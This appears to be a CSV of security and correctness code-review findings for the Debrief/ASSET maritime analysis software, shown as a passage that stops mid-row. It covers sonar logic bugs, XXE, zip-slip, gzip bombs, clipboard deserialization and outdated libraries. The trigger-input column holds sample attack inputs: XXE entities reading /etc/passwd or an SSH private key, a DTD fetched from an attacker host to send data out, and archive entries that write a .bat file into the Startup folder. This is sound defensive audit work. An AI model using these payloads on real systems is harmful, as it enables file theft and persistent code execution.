id,slice,plugin,package,class,file_path,category,issue_type,severity,confidence,status,title,description,instances,trigger_input,suggested_fix,effort,llm_value,related,github_issue
CR-001,A8,org.mwc.asset.legacy,ASSET.Models.Sensor.Initial,NarrowbandSensor,org.mwc.asset.legacy/src/ASSET/Models/Sensor/Initial/NarrowbandSensor.java,algorithm-correctness,logic-error,Critical,High,candidate,Narrowband sensor reports a contact on every narrowband target regardless of ...,"detectThis calls super.detectThis (sonar-equation gate) only when hasBearing is true (L322-L323); then, whenever the target has a NarrowbandRadNoise medium, it creates a DetectionEvent if res is null (L332-L336) and attaches a Doppler frequency. Consequently a target that failed the signal-excess test (or when HasBearing=false) is still reported as detected, at any range, with course and speed. The propagation-loss/steady-array gating is bypassed for all narrowband contacts. (Lines re-read by the merging reviewer; the code matches the description.)",L322-L336,Scenario with a NarrowbandSensor on ownship and a target with NarrowbandRadNoise placed 500 nm away: a detection with frequency is produced every scan even though super.detectThis returns null.,Only create the frequency-only event when the SNR gate passed (e.g. compute a boolean 'detected' from super.detectThis or re-run the SE calculation when hasBearing is false); never fabricate a detection when res==null because SE<=0.,M,Needs reading the control flow of the override against the base-class contract; nothing greppable.,-,
CR-002,A8,org.mwc.asset.legacy,ASSET.Participants,CoreParticipant,org.mwc.asset.legacy/src/ASSET/Participants/CoreParticipant.java,algorithm-correctness,logic-error,Critical,High,candidate,getSelfNoiseFor() always returns 0: own-ship self noise ignored by all passiv...,"getSelfNoiseFor declares 'final double res = 0', calls selfNoise.radiatedEnergyFor(...) and discards the result, so every caller (BroadbandSensor.getOSNoise L252, NarrowbandSensor L458, ActiveBroadbandSensor L217) feeds 0 dB own-ship noise into the passive sonar equation in InitialSensor.detectThis L177. Self noise configured via setSelfNoise/RadiatedCharacteristics has no effect, so signal excess and detection ranges are silently over-estimated for every participant that has a self-noise model. (Lines re-read by the merging reviewer; the code matches the description.)",L671-L680,Any scenario with a participant that has SelfNoise radiated characteristics and a Broadband/Narrowband sensor: detection range is identical whether self noise is 15 dB or 150 dB (see BBSensorTest.testHeloDetection L88-L99 which sets ff self noise 15).,"Return the value: 'res = selfNoise.radiatedEnergyFor(medium, status, brg_degs);' (drop the final).",S,Requires noticing that a computed value is discarded and tracing the callers into the sonar equation; a linter would flag unused result only if configured.,-,
CR-003,A1,org.mwc.asset.legacy,ASSET.Util.MonteCarlo,ScenarioGenerator,org.mwc.asset.legacy/src/ASSET/Util/MonteCarlo/ScenarioGenerator.java,security,xxe,High,High,candidate,Monte-Carlo scenario/control document parsing allows external entities,"createNewBuilder() configures namespace awareness and a schema-language attribute but never disables doctype/external entities or enables FEATURE_SECURE_PROCESSING; readDocumentFrom() parses the user-supplied scenario template and control file with it. The generated documents are later serialised and written to disk, so entity content (e.g. a local file) is also persisted into the output scenarios.",L394-L443; L477-L506,"ASSET control file with <!DOCTYPE ScenarioController [<!ENTITY f SYSTEM ""file:///C:/Users/analyst/.ssh/id_rsa"">]> and an attribute value &f;","Harden the factory (secure processing, disallow-doctype-decl, no external entities, no XInclude) in createNewBuilder().",S,grep-able,CWE-611,
CR-004,A1+A8,org.mwc.asset.legacy,ASSET.Util.MonteCarlo,ScenarioGenerator,org.mwc.asset.legacy/src/ASSET/Util/MonteCarlo/ScenarioGenerator.java,security,path-traversal,High,Medium,candidate,Output directory and file names for generated scenarios come from untrusted XML,"setVariances() takes the OutputDirectory attribute of the ScenarioController element straight from the control file; MultiScenarioPresenter only remaps it when isRelativePath() is true, so an absolute path is honoured. writeTheseToFile() then mkdirs() that directory, writes control_file.xml there and writes each scenario to getDirectory()+'/'+id+'/'+scen_name+'.xml' where scen_name is the Name attribute from the scenario template, unescaped, so '../../' sequences escape the directory. RecordToFileObserverType observers are also pointed at the same directory. A crafted control+template pair thus writes attacker-influenced XML anywhere the user can write. || writeTheseToFile builds the output path from the scenario's Name attribute without sanitising (theDir + scen_name + '.xml', L1039); a template whose Scenario Name is '../../evil' writes outside the output directory. With deleteExisting=true it also recursively deletes getDirectory() (L991), a path taken from the control file's OutputDirectory attribute (setVariances L968-L972) unless overridden. Both are untrusted data-file inputs to the Monte-Carlo generator.","L937-L978 (L966); L986-L1060 (L998-L1002, L1031-L1043); L991; L1039; L968-L972","Control file <ScenarioController OutputDirectory=""C:/Users/analyst/Startup""> plus a template whose Scenario Name=""../../evil""",Require the output directory to be chosen through the UI or restricted to the workspace; sanitise scen_name to a safe basename and verify the canonical path stays inside the output directory.,M,"Needed to trace the attribute from the SAX handler through ResultsContainer, the presenter's relative-path check and into the file writer.",MultiScenarioPresenter L549-L568; ScenarioControllerHandler L65-L70,
CR-005,A1,org.mwc.cmap.legacy,MWC.Utilities.ReaderWriter.XML,MWCXMLReader,org.mwc.cmap.legacy/src/MWC/Utilities/ReaderWriter/XML/MWCXMLReader.java,bug,silent-data-loss,High,High,candidate,"readThisDouble accepts partial numbers, maps NaN to 0, and attribute parse er...","readThisDouble() uses DecimalFormat.parse(), which parses only the longest valid prefix and ignores the remainder, so '1.2E1' becomes 1.2, '12abc' becomes 12 and exponent-notation values written by other tools are silently truncated; 'NaN' is silently turned into 0 (course north). When parsing does fail, HandleDoubleAttribute/HandleDateTimeAttribute and handleOurselves() catch the exception, log it to the trace file and continue, so the attribute silently keeps its default (0, previous value or null) and the user sees a complete-looking plot with wrong numbers. All Debrief/ASSET XML numeric attributes go through this path.",L79-L86; L96-L104; L222-L241; L434-L443,"<fix Course=""9.0E1"" Speed=""1.2E1"" .../> in a .dpf: imported with course 9 deg and speed 1.2 kts instead of 90 deg and 12 kts, no user-visible warning",Use ParsePosition and reject input with unconsumed characters (or Double.parseDouble after normalising the decimal separator); accumulate attribute errors and surface them to the user at end of import instead of trace-only logging.,M,Required knowing DecimalFormat's prefix-parse semantics and following how the handler base class swallows exceptions; not detectable by grep.,-,
CR-006,A1,org.mwc.cmap.legacy,MWC.Utilities.ReaderWriter.XML,MWCXMLReaderWriter,org.mwc.cmap.legacy/src/MWC/Utilities/ReaderWriter/XML/MWCXMLReaderWriter.java,security,xxe,High,High,candidate,SAX parser for .dpf/.xml/.asf import resolves external entities and DTDs,"getConfiguredParser() returns SAXParserFactory.newInstance().newSAXParser() with no hardening: disallow-doctype-decl, external-general-entities, external-parameter-entities and load-external-dtd are all left at JDK defaults (enabled), and the hardening lines are commented out. Every Debrief plot (.dpf/.xml), ASSET scenario/control file (.asf) and NaturalEarth store goes through doImport(), so a crafted file can read local files into attribute values and exfiltrate them via a parameter-entity SYSTEM URL, or make the parser fetch arbitrary URLs. Entity-expansion bombs are bounded only by the JDK's default jdk.xml limits since FEATURE_SECURE_PROCESSING is never set explicitly.",L86-L103; L157-L163,".dpf beginning <!DOCTYPE plot [<!ENTITY % p SYSTEM ""http://attacker/x.dtd""> %p;]> or <!ENTITY xxe SYSTEM ""file:///etc/passwd""> used inside a Label attribute","In getConfiguredParser set factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING,true), http://apache.org/xml/features/disallow-doctype-decl=true (or the two external-entities features false and load-external-dtd false) and set an EntityResolver that rejects external ids; do the same for ASSETReaderWriter which reuses doImport.",S,"grep-able for the factory call, but confirming that every importer (Debrief plot, ASSET, NaturalEarth) funnels through this one unhardened doImport needed tracing the class hierarchy.",CWE-611,
CR-007,A1,org.mwc.cmap.legacy,MWC.Utilities.ReaderWriter.XML.Util,ShortLocationHandler,org.mwc.cmap.legacy/src/MWC/Utilities/ReaderWriter/XML/Util/ShortLocationHandler.java,bug,silent-data-loss,High,High,candidate,"Unparseable Lat/Long silently produces a position at 0,0","handleOurselves() resets _lat/_long/_depth to 0.0 then parses each attribute; a ParseException is caught and only traced, so elementClosed() still builds a WorldLocation, placing the fix/shape on the equator/prime meridian with no user warning. Combined with readThisDouble's prefix parsing, values such as '5.0E1' silently become 5.0 degrees.",L54-L74; L46-L50,"<shortLocation Lat=""N50.5"" Long=""-1.2"" Depth=""0""/> loads as latitude 0.0",Track parse failure and skip the element (or throw) instead of emitting a default location; report to the user.,S,Needs reading the reset-then-parse-then-construct sequence across two methods.,-,
CR-008,A1+A10,org.mwc.debrief.core,org.mwc.debrief.core.loaders,GpxUtil,org.mwc.debrief.core/src/org/mwc/debrief/core/loaders/GpxUtil.java,security,xxe,High,High,candidate,GPX import via JDOM SAXBuilder and schema Validator with default entity handling,"getDocumentSource() parses the GPX file with new SAXBuilder() (JDOM default: expandEntities=true, external entities resolved) and isValid() re-parses the file with a javax.xml.validation Validator that is also left at defaults. Both are reached from JaxbGpxHelper.unmarshall() for every .gpx opened, so a GPX file can trigger XXE twice. || getDocumentSource builds the GPX document with new SAXBuilder() and no feature hardening, so external general/parameter entities and external DTDs are resolved before schema validation runs (validation happens afterwards on the already-expanded JDOM tree). Entity content flows into track/waypoint names via JAXB unmarshalling, giving local file disclosure and SSRF-style outbound requests from a data file.",L64-L72; L86-L91; L101-L118; L120-L140; L137-L140 (JaxbGpxHelper.unmarshall consumes the source),".gpx with <!DOCTYPE gpx [<!ENTITY x SYSTEM ""file:///etc/passwd"">]><gpx version=""1.1""><trk><name>&x;</name>...",Create SAXBuilder(XMLReaders.NONVALIDATING) and set the external-entity/doctype features false; on the Validator set ACCESS_EXTERNAL_DTD and ACCESS_EXTERNAL_SCHEMA to empty strings.,S,Needed to know JDOM's default entity behaviour and follow the call chain from JaxbGpxHelper to see the file is parsed twice.,CWE-611,
CR-009,A1,org.mwc.debrief.legacy,Debrief.ReaderWriter.XML.KML,ImportKML,org.mwc.debrief.legacy/src/Debrief/ReaderWriter/XML/KML/ImportKML.java,security,xxe,High,High,candidate,KML/KMZ DOM parse uses unhardened DocumentBuilderFactory,"doImport() builds a DocumentBuilderFactory with defaults and parses the whole (untrusted) KML text with loader.parse(); doctype declarations and external general/parameter entities are allowed, so a KML or the .kml entry of a KMZ can read local files or make network requests. The pre-pass stripNonValidXMLCharacters does nothing to entities.",L157-L173,".kml containing <!DOCTYPE kml [<!ENTITY x SYSTEM ""file:///etc/hostname"">]> and <name>&x;</name> inside a Placemark","Set FEATURE_SECURE_PROCESSING, disallow-doctype-decl, setExpandEntityReferences(false) and setXIncludeAware(false) on the factory.",S,grep-able,CWE-611,
CR-010,A1,org.mwc.debrief.legacy,Debrief.ReaderWriter.XML.KML,ImportKML,org.mwc.debrief.legacy/src/Debrief/ReaderWriter/XML/KML/ImportKML.java,bug,null-deref,High,High,candidate,KML import assumes a fixed radar-plot layout; any other KML throws unchecked ...,"For every Placemark with a MultiGeometry the code calls getElementsByTagName(...).item(0).getTextContent() for name/when/coordinates/description without null checks, Integer.parseInt on the first '-' token of the name, indexes coords[2], and substring(startI+7,endI-1) in courseFrom/speedFrom; the LineString branch does fileName.substring(1,len-1) and StringTokenizer.nextToken() three times per point. NPE/NumberFormatException/ArrayIndexOutOfBounds/NoSuchElementException are not in the catch list (L256-L264), so they escape doImport and doZipImport uncaught. Also getElementsByTagName never returns null so the lineString != null test is always true.",L195-L212; L217-L223; L226-L230; L246-L247; L336-L338; L256-L264,"Any Google-Earth KML whose Placemark has a MultiGeometry but a <name> of 'Ship A' or coordinates 'lon,lat' without altitude; or a KML with 2 coordinate tokens per point","Null-check each lookup, validate token counts, catch RuntimeException per Placemark and report a summary to the user.",M,"Needs understanding of DOM API semantics (item(0) null, getElementsByTagName non-null) and the exception flow.",-,
CR-011,A2,org.mwc.debrief.legacy,Debrief.ReaderWriter.XML.KML,ImportKML,org.mwc.debrief.legacy/src/Debrief/ReaderWriter/XML/KML/ImportKML.java,security,zip-bomb,High,High,candidate,KMZ entries inflated fully into memory with no size cap,"doZipImport() copies every '*.kml' entry byte-by-byte into a ByteArrayOutputStream with no limit on inflated size or entry count, then doImport() re-materialises it as a String (2 bytes/char) plus a stripped copy and a DOM, so peak memory is 5-6x the inflated size. A small KMZ with a highly compressible KML entry exhausts the JVM heap (OutOfMemoryError) and takes down the workbench job. Reached through KMLLoader for any *.kmz opened or dropped.",L284-L298; L306-L318; org.mwc.debrief.core KMLLoader.java L45,A 1 MB .kmz containing a.kml that inflates to 2 GB of spaces/comments.,Track bytes read per entry and abort above a budget (e.g. 256 MB); stream the entry straight into the SAX/DOM parser instead of buffering; use a buffered read(byte[]) loop.,S,Needed to follow the multiple in-memory copies across doZipImport/inputStreamAsString/stripNonValidXMLCharacters to size the amplification.,-,
CR-012,A2,org.mwc.debrief.legacy,Debrief.ReaderWriter.XML.csv_gz,Import_CSV_GZ,org.mwc.debrief.legacy/src/Debrief/ReaderWriter/XML/csv_gz/Import_CSV_GZ.java,security,zip-bomb,High,High,candidate,GZIP payload inflated fully into memory with no cap (gzip bomb),"doZipImport() reads the entire GZIPInputStream one byte at a time into a ByteArrayOutputStream before parsing. gzip compresses runs ~1000:1, so a 10 MB .csv.gz can inflate to ~10 GB and OOM the workbench; the byte-at-a-time loop also makes legitimate multi-hundred-MB files extremely slow. On exception the GZIPInputStream is not closed and the failure is only printStackTrace()d.",L1274-L1295; org.mwc.debrief.core CSV_GZ_Loader.java L50,"A small .csv.gz whose payload is gigabytes of repeated characters, opened via the CSV_GZ loader.",Wrap the GZIPInputStream in a BufferedReader and feed doImport() line by line with a running byte budget; never buffer the whole file; close in finally and report errors.,S,grep-able,-,
CR-013,A2,org.mwc.debrief.legacy,Debrief.ReaderWriter.powerPoint,PlotTracks,org.mwc.debrief.legacy/src/Debrief/ReaderWriter/powerPoint/PlotTracks.java,algorithm-correctness,time-handling,High,Medium,candidate,Time box labels taken from an arbitrary first track and ignore its stepsToSkip,"createTimeNarrativeShapes() builds the animated time captions from trackData.getTracks().get(0) only (L542) and schedules them from delay 0 (L556) with one step per point (L537, L590). The track list comes from CoreCoordinateRecorder._tracks, a HashMap (order depends on name hashes), so the 'first' track may be one that started late (stepsToSkip>0) or ended early. Its first point's timestamp is then shown at t=0 while the markers for that time appear stepsToSkip*interval later, and no captions exist after the shorter track ends. The exported PPTX shows wrong times for the displayed positions.",L530-L600 (esp. L537; L542; L556); CoreCoordinateRecorder.java L190; L283; L352-L354,Record a PPTX export where track B becomes visible several steps after track A and B hashes before A: the time caption reads B's first DTG while A is still at its earlier positions.,"Keep the recorder's _times list (one DTG per step) in TrackData and generate one caption per step from it, with delay = stepIndex*interval; do not derive captions from a track.",M,Requires following the data flow from the HashMap in the recorder through the exporter to see that ordering and stepsToSkip both change the visible result.,-,
CR-014,A2,org.mwc.debrief.legacy,Debrief.ReaderWriter.powerPoint,UnpackFunction,org.mwc.debrief.legacy/src/Debrief/ReaderWriter/powerPoint/UnpackFunction.java,security,zip-slip,High,High,candidate,"PPTX template extracted with zip4j 1.3.2 extractAll, no entry-name canonical ...","unpackFunction() hands the user-selected 'master template' .pptx to net.lingala.zip4j.core.ZipFile.extractAll(). zip4j 1.3.2 (bundled in libs/) predates the Zip Slip fix and writes each entry to outPath + entryName without verifying the canonical path stays under outPath (I inspected the bundled UnzipEngine class: no getCanonicalPath/illegal-name check). Entry names such as ../../../../Users/x/AppData/Roaming/... therefore write arbitrary files. Reached from PrefsPage.updateDimensions() as soon as a template path is typed, from ExportPPTDialog.okPressed() (validateDonorFile) and from every PPTX export.",L67-L68; PlotTracks.java L155; org.mwc.debrief.core PrefsPage.java L182,"A .pptx (zip) whose entry names include ../ segments, e.g. '../../../startup/evil.bat', selected as the PowerPoint master template in Preferences (or distributed as a 'corporate template').","Upgrade zip4j to >= 2.x (API changed) or iterate FileHeaders and reject any entry whose File(outPath,name).getCanonicalPath() does not start with outPath's canonical path before extractFile(). Also cap total extracted size.",M,"Needed to trace that the template path flows from a preference/dialog into a library call, and to check the bundled jar version's UnzipEngine for the missing canonical-path guard.",Zip Slip (Snyk 2018) - zip4j fixed in 1.3.3,
CR-015,A3,org.mwc.cmap.core,org.mwc.cmap.core.operations,RightClickCutCopyAdaptor,org.mwc.cmap.core/src/org/mwc/cmap/core/operations/RightClickCutCopyAdaptor.java,security,unsafe-deserialization,High,High,candidate,Clipboard bytes deserialized with unfiltered ObjectInputStream (EditableTrans...,"EditableTransfer.nativeToJava wraps the raw byte[] pulled from the system clipboard (SWT type name CMAP_EDITABLE, L519) in a plain ObjectInputStream and calls readObject() with no ObjectInputFilter, class allowlist or size limit. Any other process on the desktop (or an RDP/VNC/browser clipboard-sync peer) can place bytes under that type name, so a Paste, or even a Cut (CutItem.rememberPreviousContents L221 reads the clipboard before overwriting it), deserializes attacker-controlled data. The bundle classloader reaches every Serializable class in cmap.core and its required bundles, so both DoS payloads (nested HashSet/serialDOS) and any available gadget chain execute during readObject before the Editable[] cast at L606.",L519-L521; L593-L616; L221,Attacker process calls SetClipboardData/ XSetSelection with format CMAP_EDITABLE containing a serialized SerialDOS object graph; analyst right-clicks Paste (or Cut) in the Outline view.,"Install an ObjectInputFilter (ObjectInputStream.setObjectInputFilter) that allowlists MWC.*/Debrief.* Editable classes, java.lang/java.util basics and arrays, with maxdepth/maxarray/maxbytes limits; alternatively keep the clipboard payload in-process (store the Editable[] in a static and only put an opaque token on the clipboard).",M,Needs reasoning that SWT ByteArrayTransfer contents originate outside the JVM and that Cut also reads the clipboard; a grep for ObjectInputStream finds the line but not the trust boundary.,-,
CR-016,A3,org.mwc.debrief.dis,org.mwc.debrief.dis.core,DISModule,org.mwc.debrief.dis/src/org/mwc/debrief/dis/core/DISModule.java,security,unbounded-allocation,High,High,candidate,EventReport PDU variableDatumLength drives byte[] allocation and iterator wit...,"handleEvent takes variableDatumLength straight from the UDP packet (VariableDatum.unmarshal reads it with readInt, so it can be negative or up to 2^31-1) and does `new byte[thisLen]` (L271-L272), then iterates thisLen times calling iter.next() on the chunk list (L275-L276). Because VariableDatum.unmarshal stops filling variableData at EOF and swallows the exception, chunks.size() is normally far smaller than thisLen: a 2 GB length gives OutOfMemoryError, a negative length gives NegativeArraySizeException, and any length larger than the remaining packet gives NoSuchElementException. All escape logPDU into NetworkDISProvider.startListening, whose catch is outside the receive loop (L288), so the DIS listener thread dies after one packet.",L267-L288,"Single 8 KB multicast datagram: PDU type 21 (EventReport), numberOfVariableDatumRecords=1, variableDatumLength=0x7FFFFFFF (or 0xFFFFFFFF) sent to the configured DIS group/port.","Clamp thisLen to chunks.size() (and to a sane max, e.g. 64 KB), treat DIS datum length as bits (divide by 8) per IEEE 1278.1, and iterate over the chunk list rather than the declared length.",S,Requires combining the swallowed-EOF behaviour in VariableDatum.unmarshal with the trusting loop in DISModule and the catch placement in NetworkDISProvider.,-,
CR-017,A3,org.mwc.debrief.dis,org.mwc.debrief.dis.providers.network,NetworkDISProvider,org.mwc.debrief.dis/src/org/mwc/debrief/dis/providers/network/NetworkDISProvider.java,bug,logic-error,High,High,candidate,Any exception from one PDU permanently kills the DIS receive loop,"startListening wraps the entire `while (_running)` loop in a single try (L241-L289); the generic catch at L288 sits outside the loop, so an exception thrown while parsing or dispatching ONE datagram (see DISModule row, or any listener bug) ends the loop, the socket is closed in finally and the view keeps showing it is connected while no further PDUs are processed. Real type: missing per-packet error isolation (robustness/DoS).",L241-L303,Any malformed EventReport PDU (see DISModule row) or a listener throwing on unexpected entity id.,Move the try/catch inside the while loop so a bad packet is logged and skipped; only exit on SocketException when !_running.,S,Simple structurally but only visible by reading loop/try nesting.,-,
CR-018,A4+A11,.github,-,main.yml,.github/workflows/main.yml,supply-chain,vulnerable-dependency,High,High,candidate,Windows product ships AdoptOpenJDK 11.0.5+10 (Oct 2019) fetched without checksum,"main.yml L152-157 wget-downloads OpenJDK11U-jre_x64_windows_hotspot_11.0.5_10.zip from the archived AdoptOpenJDK GitHub releases with no SHA256 verification, caches it (L145-150) and bundles it into org.mwc.debrief.combined.feature/win-64/jre (L162-169). Windows users therefore run a JRE missing roughly 25 quarterly CPUs (e.g. CVE-2020-2803/2805 deserialisation, CVE-2020-14583, CVE-2021-2163, CVE-2022-21496 JNDI, CVE-2023-21930 TLS, CVE-2024-21011..21094) while Debrief parses untrusted XML/ZIP/Office files with JDK classes; a tampered download would also be bundled silently. || L156-157 download OpenJDK11U-jre_x64_windows_hotspot_11.0.5_10.zip and L162-169 stage it into org.mwc.debrief.combined.feature/win-64 so it is bundled inside DebriefNG-Windows64Bit.zip and the MSI (contribs/msi/make_x64msi.sh L13 uses the same URL). 11.0.5 predates roughly 25 quarterly CPUs; every released Windows Debrief runs the analyst's untrusted data files on a JRE with dozens of known CVEs (e.g. CVE-2020-2803, CVE-2020-14583, CVE-2021-2163, CVE-2022-21496, CVE-2023-21930, CVE-2024-21011). The cache key `win-jre-11.0.5-10` (L150) pins it further.",.github/workflows/main.yml L145-L157; L162-L169; L145-157; L162-169; contribs/msi/make_x64msi.sh L13,Any release build: the JRE zip is trusted as downloaded; end-user opens a malicious file with the bundled 2019 JRE.,"Pin the latest Temurin 11/17 (or 25 per #5237) via the Adoptium API with the published SHA256 checked (sha256sum -c) or use actions/setup-java's JRE download with checksum, and bump on each release.",S,grep-able for the URL; the impact needed the age comparison and product-bundling step.,#5237; CVE-2022-21496; CVE-2020-2803,
CR-019,A4,org.mwc.cmap.legacy,-,commons-compress-1.19.jar,org.mwc.cmap.legacy/libs/commons-compress-1.19.jar,supply-chain,vulnerable-dependency,High,Medium,candidate,commons-compress 1.19 zip OOM (CVE-2021-36090) reachable via .docx import,"commons-compress 1.19 is vulnerable to CVE-2021-36090 (crafted ZIP makes ZipFile/ZipArchiveInputStream allocate huge memory), CVE-2021-35515/35516/35517 (7z, tar infinite loop/OOM) and CVE-2024-25710. It is on the cmap.legacy Bundle-ClassPath (L18) and is the ZIP implementation POI 4.1.2's OPCPackage uses when Debrief opens OOXML files, so it is reachable from MsDocXLoader (.docx) and ImportASWDataDocument (XWPFDocument at L616). Debrief's own use is only GzipUtils filename helpers in Import_CSV_GZ tests.","org.mwc.cmap.legacy/META-INF/MANIFEST.MF L18; org.mwc.debrief.legacy/src/Debrief/ReaderWriter/Word/ImportRiderNarrativeDocument.java L343, L354; org.mwc.debrief.legacy/src/Debrief/ReaderWriter/Word/ImportASWDataDocument.java L616; org.mwc.debrief.core/plugin.xml L228",A .docx whose ZIP central directory is crafted per CVE-2021-36090 opened via File > Open (extension docx).,Upgrade commons-compress to 1.26.x+ together with POI 5.x (POI 5 requires commons-compress 1.21+).,S,Required knowing POI delegates OOXML zip handling to commons-compress; OSV alone flags the jar but not the .docx path.,CVE-2021-36090; CVE-2021-35515; CVE-2021-35516; CVE-2021-35517; CVE-2024-25710; #5237,
CR-020,A4,org.mwc.cmap.media,-,xuggle-xuggler.jar,org.mwc.cmap.media/lib/xuggle-xuggler.jar,supply-chain,vulnerable-dependency,High,Medium,candidate,Xuggler 4.0.1084 (2011) ships unpatched native FFmpeg for analyst media,"xuggle-xuggler.jar (Implementation-Version 4.0.1084, built 2011, project abandoned 2013) wraps native libavcodec/libavformat from the FFmpeg 0.x era via jni_helper.jar and is loaded by NativeLibrariesLoader; PlayingThread L228 IContainer.make() opens whatever video/audio file the analyst attaches to a plot. Every FFmpeg memory-safety CVE published since 2011 therefore applies to the shipped natives and no update is possible. Plugin is shipped in org.mwc.cmap.combined.feature.",org.mwc.cmap.media/META-INF/MANIFEST.MF L18-L26; org.mwc.cmap.media/src/org/mwc/cmap/media/xuggle/impl/PlayingThread.java L228; org.mwc.cmap.media/src/org/mwc/cmap/media/xuggle/NativeLibrariesLoader.java,A crafted .avi/.mp4 opened in the Debrief media player view.,"Replace Xuggler with JavaFX Media, VLCJ (system libvlc) or a maintained javacv/ffmpeg-platform artifact that is updated with the build; or drop video playback.",L,No Maven coordinates exist so OSV/Dependabot cannot flag it; needed manifest inspection and knowing Xuggler embeds FFmpeg natives.,#5237,
CR-021,A4,org.mwc.debrief.core,-,jdom-1.0.jar,org.mwc.debrief.core/libs/jdom-1.0.jar,supply-chain,vulnerable-dependency,High,High,candidate,JDOM 1.0 SAXBuilder (CVE-2021-33813) parses untrusted .gpx with XXE enabled,"JDOM before 2.0.6.1 (CVE-2021-33813) resolves external entities by default and has no safeguards; jdom-1.0.jar dates from 2004. GpxUtil.getDocumentSource builds a default SAXBuilder (L87) and parses the GPX file stream (L88) for every GPX import registered at plugin.xml L176, so a hostile .gpx can exfiltrate local files via an external DTD/entity or trigger billion-laughs.",org.mwc.debrief.core/META-INF/MANIFEST.MF L6 (Bundle-ClassPath); org.mwc.debrief.core/src/org/mwc/debrief/core/loaders/GpxUtil.java L87-L88; org.mwc.debrief.core/plugin.xml L176,".gpx starting with <!DOCTYPE gpx [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]> and using &xxe; in a <name> element","Replace with the platform JAXP parser (secure-processing on, disallow-doctype-decl) or JDOM 2.0.6.1 with builder.setFeature(""http://apache.org/xml/features/disallow-doctype-decl"", true); setExpandEntities(false).",S,grep-able for SAXBuilder; the dependency-age link is what makes it a supply-chain row.,CVE-2021-33813,
CR-022,A4,org.mwc.debrief.legacy,-,pdfbox-2.0.3.jar,org.mwc.debrief.legacy/libs/pdfbox-2.0.3.jar,supply-chain,vulnerable-dependency,High,High,candidate,PDFBox 2.0.3 (2016) DoS/infinite-loop CVEs reachable via .pdf import,"pdfbox 2.0.3 and fontbox 2.0.3 are subject to CVE-2018-8036 (infinite loop in AFM parser), CVE-2018-11797 (infinite loop in crafted PDF), CVE-2021-27807/27906 (infinite loop / OOM loading PDF) and CVE-2021-31811/31812 (OOM and infinite loop). PDDocument.load(inputStream) is called on any file the analyst opens via PdfLoader (registered for extension pdf in org.mwc.debrief.core/plugin.xml L232), so a crafted PDF hangs or crashes the workbench.","org.mwc.debrief.legacy/META-INF/MANIFEST.MF L7, L9; Debrief/ReaderWriter/Word/ImportNarrativeDocument.java L1901-L1905; org.mwc.debrief.core/plugin.xml L232; org.mwc.debrief.core/src/org/mwc/debrief/core/loaders/PdfLoader.java L39-L40",Drag a PDF crafted per CVE-2021-31812 (self-referencing page tree) onto the plot; PDFTextStripper never returns.,Upgrade pdfbox/fontbox to 2.0.31+ (drop-in for the 2.0 API) or 3.0.x; run the import in a cancellable Job with a timeout.,S,grep-able once the version is known; reachability needed reading the loader registration.,CVE-2018-8036; CVE-2018-11797; CVE-2021-27807; CVE-2021-27906; CVE-2021-31811; CVE-2021-31812; #5237,
CR-023,A4,org.mwc.debrief.legacy,-,zip4j-1.3.2.jar,org.mwc.debrief.legacy/libs/zip4j-1.3.2.jar,supply-chain,vulnerable-dependency,High,High,candidate,zip4j 1.3.2 zip-slip: extractAll() on user-chosen .pptx template,"zip4j 1.3.2 (2015) has no path-traversal check in ZipFile.extractAll (CVE-2018-1002202) plus DoS on crafted archives (CVE-2022-24615) and skipped integrity checks (CVE-2023-22899). Debrief.ReaderWriter.powerPoint.UnpackFunction L67-68 calls new ZipFile(pptx_path).extractAll(unpack_path) on the PowerPoint export template the analyst picks in Preferences (org.mwc.debrief.core PrefsPage L115-119, invoked at L180), so a crafted template writes files anywhere the user can write. Referenced by MANIFEST.MF L17 and shipped.","org.mwc.debrief.legacy/META-INF/MANIFEST.MF L17; Debrief/ReaderWriter/powerPoint/UnpackFunction.java L67-L68; org.mwc.debrief.core/src/org/mwc/debrief/core/preferences/PrefsPage.java L115-L119, L180","A .pptx 'template' sent to an analyst containing an entry named ../../../../Users/<user>/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/x.bat, selected in Preferences > Debrief > PPT template",Upgrade to net.lingala.zip4j:zip4j 2.11.5+ (API changed: package net.lingala.zip4j.ZipFile) and additionally canonicalise each entry path against the target directory before extraction.,S,Needed tracing PrefsPage -> PlotTracks -> UnpackFunction to show the archive is user-supplied rather than a build artefact.,CVE-2018-1002202; CVE-2022-24615; CVE-2023-22899,
CR-024,A5,org.mwc.cmap.legacy,MWC.Algorithms.EarthModels,FlatEarth,org.mwc.cmap.legacy/src/MWC/Algorithms/EarthModels/FlatEarth.java,algorithm-correctness,degenerate-input,High,High,verified,Default earth model does not wrap longitude across the antimeridian,"subtract() forms DELTA_LONG = LONG2 - LONG1 with no normalisation to [-pi,pi], and add() writes NEW_LONG without wrapping to [-180,180]. FlatEarth is the lazily-installed default model in WorldLocation, so every rangeFrom/bearingFrom crossing 180 deg longitude goes the long way round. Verified by compiling: rangeFrom((0,179.9E),(0,179.9W)) = 359.8 deg instead of 0.2 deg, bearing reversed. CompletelyFlatEarth (L195-L202) has the same defect.",L206-L213; L216-L228; L136-L141,".rep track with consecutive fixes at 179.95E and 179.95W: leg length, speed-over-ground, range/bearing tote and TMA solutions computed from these fixes are wrong by ~360 deg of arc; fit-to-window covers the whole globe.","Normalise DELTA_LONG to (-pi,pi] in subtract() (e.g. Math.atan2(sin,cos) or add/subtract 2pi) and wrap NEW_LONG in add(); mirror in CompletelyFlatEarth.",S,The invariant (longitude is cyclic) is domain knowledge; the arithmetic is otherwise well formed so no static rule flags it.,CompletelyFlatEarth L195-L202,
CR-025,A5,org.mwc.cmap.legacy,MWC.GenericData,WorldLocation,org.mwc.cmap.legacy/src/MWC/GenericData/WorldLocation.java,algorithm-correctness,unit-mismatch,High,High,verified,perpendicularDistanceBetween ignores cos(lat): cross-track distance wrong,"perpendicularDistanceBetween/rangeFrom(lineStart,lineEnd) builds Point2D from raw (long,lat) degrees and returns the Euclidean distance as WorldDistance.DEGS, so a longitude degree is weighted like a latitude degree regardless of latitude, and the result ignores the configured EarthModel. Verified by compiling the class: at 60N a point 1 deg of longitude east of a N-S segment reports 60.0 nm off-track where the true separation (same class, rangeFrom) is 30.0 nm; error is a factor 1/cos(lat) in the cross-track direction. Consumers include org.mwc.cmap.xyplot LocationCalculator (cross-track xy plots), SensorContactWrapper bearing-line hit testing and PolygonShape.",L281-L303; L625-L633; L692-L694,"Track at 60N, LocationCalculator cross-track distance of a fix 1 deg longitude off a north-south leg: reports 60 nm instead of 30 nm.","Scale x by cos(mean latitude) before the segment projection (or project via the EarthModel / rangeFrom with a 